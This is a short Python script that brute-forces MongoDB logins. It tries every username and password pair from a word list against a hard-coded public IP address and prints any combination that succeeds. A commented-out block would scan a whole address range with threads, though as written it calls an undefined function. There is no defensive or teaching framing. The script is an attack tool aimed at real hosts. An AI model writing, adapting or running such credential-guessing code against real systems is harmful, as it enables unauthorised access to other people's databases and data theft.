import pymongo
import threading

class MongoScanner:
    def __init__(self,ip,port=27017):
        self.ip = ip
        self.port = port

    def connect(self,username,password):
        try:
            mongo = pymongo.MongoClient(
                'mongodb://{}:{}@{}/'.format(username, password, self.ip))
            dblist = mongo.list_database_names()
            return 'success'
        except Exception as e:
            if('10061' in str(e) or 'out' in str(e)):
                return 'timeout'
            else:
                return 'fail'

if __name__ == '__main__':
    lines = open('pwd.txt').readlines()
    for username in lines:
        for password in lines:
            r = MongoScanner('129.204.234.135').connect(username,password)
            if(r=='success'):
                print(r,username,password)
            
    # for ip3 in range(234, 235):
    #     for ip4 in range(0, 255):
    #         threading.Thread(target=mongo, args=(
    #             '129.204.'+str(ip3)+'.' + str(ip4),)).start()
